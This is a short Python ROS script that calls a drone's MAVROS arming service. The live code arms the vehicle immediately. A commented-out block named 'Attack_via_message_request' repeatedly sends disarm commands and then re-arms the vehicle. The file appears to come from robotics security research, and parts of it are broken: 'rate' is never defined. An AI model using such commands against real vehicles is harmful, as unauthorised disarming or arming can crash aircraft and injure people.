#!/usr/bin/env python3

import sys
import rospy

from mavros_msgs.srv import *


vehicle_info = rospy.ServiceProxy('mavros/cmd/arming', CommandBool)
msg_rec = vehicle_info(True)

'''
if __name__ == "__main__":
	
	rospy.init_node("Attack_via_message_request")
	rospy.wait_for_service('mavros/cmd/arming')
	#rate = rospy.Rate(5000)
	
	while not rospy.is_shutdown():
		try:
			vehicle_info = rospy.ServiceProxy('mavros/cmd/arming', CommandBool)
			msg_rec = vehicle_info('False')
			
		except rospy.ServiceException as e:
			print("Service call failed")
		
		rate.sleep()
	
	vehicle_info = rospy.ServiceProxy('mavros/cmd/arming', CommandBool)
	msg_rec = vehicle_info('True')
	'''
